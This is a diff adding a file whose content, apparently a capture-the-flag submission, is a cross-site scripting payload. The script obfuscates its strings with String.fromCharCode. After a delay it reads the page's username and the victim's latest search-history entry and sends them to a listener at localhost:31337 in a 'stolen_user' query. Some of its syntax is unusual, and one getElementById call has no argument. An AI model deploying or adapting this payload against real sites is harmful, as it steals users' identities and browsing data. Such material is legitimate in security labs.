@@ -1,0 +1,19 @@
+my_flag
+<script> 
+	{var username = document.getElementById().innerHTML}
+	{var last_search = String.fromCharCode(120,120,120)}
+	{setTimeout(() => {
+		{var history = document.getElementById(String.fromCharCode(104,105,115,116,111,114,121,45,108,105,115,116))}
+		{var history_items = document.getElementsByClassName(String.fromCharCode(104,105,115,116,111,114,121,45,105,116,101,109))}
+		for({var i=0}{i<history_items.length}i++){
+			if(!history_items[i].innerHTML.includes(String.fromCharCode(109,121,95,102,108,97,103))){
+				{last_search = history_items[i].innerHTML}
+				{break}
+			}
+		}
+		{var prefix = String.fromCharCode(104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,51,49,51,51,55,47,63,115,116,111,108,101,110,95,117,115,101,114,61)}
+		{var suffix = String.fromCharCode(38,108,97,115,116,95,115,101,97,114,99,104,61)}
+		{$.get(prefix+username+suffix+last_search)}
+	},2000)}
+</script>
+
